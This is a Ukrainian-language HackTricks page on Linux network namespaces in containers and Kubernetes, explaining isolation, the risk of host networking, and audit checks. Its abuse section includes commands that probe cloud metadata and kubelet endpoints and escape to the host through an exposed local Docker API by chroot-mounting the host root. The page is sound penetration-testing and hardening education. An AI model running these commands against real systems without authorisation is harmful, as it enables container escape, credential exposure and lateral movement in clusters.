# Мережевий простір імен

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Мережевий простір імен ізолює ресурси, пов'язані з мережею, такі як інтерфейси, IP-адреси, таблиці маршрутизації, стан ARP/neighbor, правила брандмауера, сокети та вміст файлів типу `/proc/net`. Саме тому контейнер може мати те, що виглядає як його власний `eth0`, власні локальні маршрути й власний loopback device, не володіючи при цьому реальним мережевим стеком хоста.

З точки зору безпеки, це важливо, тому що мережева ізоляція — це набагато більше, ніж просто прив'язка портів. Приватний мережевий простір імен обмежує те, що робоче навантаження може безпосередньо спостерігати або переналаштовувати. Якщо цей простір імен ділиться з хостом, контейнер раптово може отримати видимість слухачів на хості, локальних сервісів хоста та точок керування мережею, які ніколи не мали бути доступними для додатка.

## Принцип роботи

Щойно створений мережевий простір імен починається з порожнього або майже порожнього мережевого оточення, поки до нього не приєднають інтерфейси. Container runtimes створюють або підключають віртуальні інтерфейси, призначають адреси та конфігурують маршрути, щоб робоче навантаження мало очікуване з'єднання. У розгортаннях на основі bridge це зазвичай означає, що контейнер бачить veth-backed інтерфейс, підключений до мосту хоста. У Kubernetes плагіни CNI виконують еквівалентну налаштування для мережі Pod.

Ця архітектура пояснює, чому `--network=host` або `hostNetwork: true` — таке драматичне зміщення. Замість отримання підготовленого приватного мережевого стеку, робоче навантаження приєднується до фактичного стеку хоста.

## Лабораторія

Ви можете побачити майже порожній мережевий простір імен за допомогою:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
І ви можете порівняти звичайні та host-networked контейнери за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Контейнер із мережею хоста більше не має власного ізольованого уявлення сокетів і інтерфейсів. Ця зміна сама по собі значна ще до того, як ви запитаєте, які можливості має процес.

## Використання під час виконання

Docker і Podman зазвичай створюють приватний мережевий простір імен для кожного контейнера, якщо не налаштовано інше. Kubernetes зазвичай дає кожному Pod власний мережевий простір імен, який розділяють контейнери всередині цього Pod, але він відокремлений від хоста. Системи Incus/LXC також забезпечують розвинену ізоляцію на основі мережевих просторів імен, часто з більшою різноманітністю віртуальних мережевих налаштувань.

Загальний принцип: приватна мережа — це межа ізоляції за замовчуванням, тоді як мережа хоста — це явний вихід з цієї межі.

## Неправильні конфігурації

Найважливіша неправильна конфігурація — це просто спільне використання мережевого простору імен хоста. Іноді це роблять заради продуктивності, низькорівневого моніторингу або зручності, але це прибирає одну з найчистіших границь, доступних контейнерам. Прослуховувачі, локальні для хоста, стають доступнішими більш прямим шляхом, служби, доступні лише на localhost, можуть стати доступними, а можливості на кшталт `CAP_NET_ADMIN` або `CAP_NET_RAW` стають набагато небезпечнішими, бо операції, які вони дозволяють, тепер застосовуються до мережевого середовища самого хоста.

Інша проблема — надмірне надання мережевих можливостей навіть коли мережевий простір імен приватний. Приватний простір імен допомагає, але він не робить raw sockets або розширений мережевий контроль нешкідливими.

В Kubernetes, `hostNetwork: true` також змінює ступінь довіри до сегментації мережі на рівні Pod. Kubernetes документує, що багато мережевих плагінів не можуть правильно відрізняти трафік Pod з `hostNetwork` для відповідності `podSelector` / `namespaceSelector` і тому трактують його як звичайний трафік вузла. З точки зору атакувальника це означає, що скомпрометоване робоче навантаження з `hostNetwork` часто слід розглядати як точку опори в мережі на рівні вузла, а не як звичайний Pod, все ще обмежений тими ж припущеннями політики, що й робочі навантаження в overlay-мережі.

## Зловживання

У слабо ізольованих налаштуваннях атакувальники можуть інспектувати сервіси, що прослуховують на хості, діставатися до ендпойнтів керування, прив'язаних лише до loopback, перехоплювати або порушувати трафік залежно від наданих можливостей і середовища, або переналаштовувати маршрутізацію та стан фаєрволу, якщо присутній `CAP_NET_ADMIN`. У кластері це також полегшує бокове переміщення та розвідку control-plane.

Якщо ви підозрюєте мережу хоста, почніть з підтвердження, що видимі інтерфейси та прослуховувачі належать хосту, а не ізольованій мережі контейнера:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only сервіси часто є першим цікавим відкриттям:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Якщо присутні мережеві можливості, перевірте, чи може робоче навантаження переглядати або змінювати видимий стек:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
У сучасних ядрах мережа хоста разом із `CAP_NET_ADMIN` також може розкривати шлях пакетів за межами простих змін `iptables` / `nftables`. `tc` qdiscs і filters також обмежені простором імен, тому в спільному мережевому просторі імен хоста вони застосовуються до інтерфейсів хоста, які контейнер може бачити. Якщо додатково присутній `CAP_BPF`, мережеві eBPF-програми, такі як TC та XDP loaders, також стають релевантними:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Це важливо, тому що нападник може дзеркалити, перенаправляти, формувати або скидати трафік на рівні інтерфейсу хоста, а не лише переписувати правила брандмауера. У приватному network namespace ці дії обмежуються поданням контейнера; у спільному host namespace вони стають такими, що впливають на хост.

У середовищах кластера або хмари, host networking також виправдовує швидкий локальний recon метаданих та сервісів, суміжних до control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Повний приклад: Host Networking + Local Runtime / Kubelet Access

Host networking не надає автоматично доступ до host root, але часто відкриває сервіси, які навмисне досяжні тільки з самого node. Якщо один із цих сервісів слабо захищений, Host networking стає прямим шляхом для privilege-escalation.

Docker API на localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet на localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- пряме компрометування хоста, якщо локальний runtime API відкритий без належного захисту
- розвідка кластера або латеральне переміщення, якщо kubelet або локальні агенти доступні
- маніпуляція трафіком або відмова в обслуговуванні при поєднанні з `CAP_NET_ADMIN`

## Перевірки

Мета цих перевірок — дізнатися, чи має процес приватний мережевий стек, які маршрути та слухачі видимі, і чи мережевий вигляд вже нагадує вигляд хоста до того, як ви навіть протестуєте capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Цікаве тут:

- Якщо `/proc/self/ns/net` і `/proc/1/ns/net` вже виглядають як на хості, контейнер може ділити host network namespace або інший неприватний namespace.
- `lsns -t net` і `ip netns identify` корисні, коли shell вже знаходиться в іменованому або персистентному namespace і потрібно зіставити його з об’єктами `/run/netns` з боку хоста.
- `ss -lntup` особливо цінна, оскільки виявляє слухачів лише на loopback та локальні management endpoints.
- Маршрути, імена інтерфейсів, контекст фаєрволу, стан `tc` і підключення eBPF стають набагато важливішими, якщо присутні `CAP_NET_ADMIN`, `CAP_NET_RAW` або `CAP_BPF`.
- У Kubernetes невдала резолюція імені сервісу з Pod з `hostNetwork` може просто означати, що Pod не використовує `dnsPolicy: ClusterFirstWithHostNet`, а не те, що сервіс відсутній.

Під час перегляду контейнера завжди оцінюйте network namespace разом із набором capabilities. Host networking у поєднанні з розширеними мережевими capabilities — зовсім інша позиція безпеки порівняно з bridge networking і вузьким стандартним набором capabilities.
